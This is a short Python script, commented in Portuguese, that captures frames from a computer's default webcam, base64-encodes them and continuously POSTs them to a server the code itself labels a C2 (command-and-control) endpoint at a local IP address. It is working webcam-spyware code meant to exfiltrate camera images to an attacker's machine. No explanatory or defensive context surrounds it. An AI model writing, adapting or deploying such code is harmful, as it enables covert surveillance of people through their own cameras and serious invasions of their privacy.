import cv2
import requests
import base64
import time

def capture_and_send_frames(c2_server):
    # Inicializa a captura de vídeo a partir da câmera padrão (0)
    cap = cv2.VideoCapture(0)

    # Verifica se a câmera foi inicializada corretamente
    if not cap.isOpened():
        print("Erro ao abrir a câmera")
        return

    while True:
        # Lê um quadro do vídeo
        ret, frame = cap.read()

        # Verifica se o quadro foi lido corretamente
        if not ret:
            print("Erro ao ler o quadro")
            break

        # Converte o quadro para base64
        _, buffer = cv2.imencode('.jpg', frame)
        frame_base64 = base64.b64encode(buffer).decode('utf-8')

        # Envia o quadro para o servidor C2
        try:
            response = requests.post(c2_server, json={'frame': frame_base64}, timeout=5)
            response.raise_for_status()
            print("Frame enviado com sucesso")
        except requests.exceptions.RequestException as e:
            print(f"Erro ao enviar o quadro para o servidor C2: {e}")
            print(f"Detalhes do erro: {e.response.text if hasattr(e, 'response') else 'Sem resposta do servidor'}")
            time.sleep(5)  # Aguarde 5 segundos antes de tentar novamente

        # Verifica se a tecla 'Esc' foi pressionada
        if cv2.waitKey(1) == 27:
            break

    # Libera a captura de vídeo
    cap.release()
    cv2.destroyAllWindows()

# URL do servidor C2
c2_server = "http://192.168.2.11:5000/upload"  # Substitua pelo endereço IP da sua máquina

# Inicia a captura e envio de frames
capture_and_send_frames(c2_server)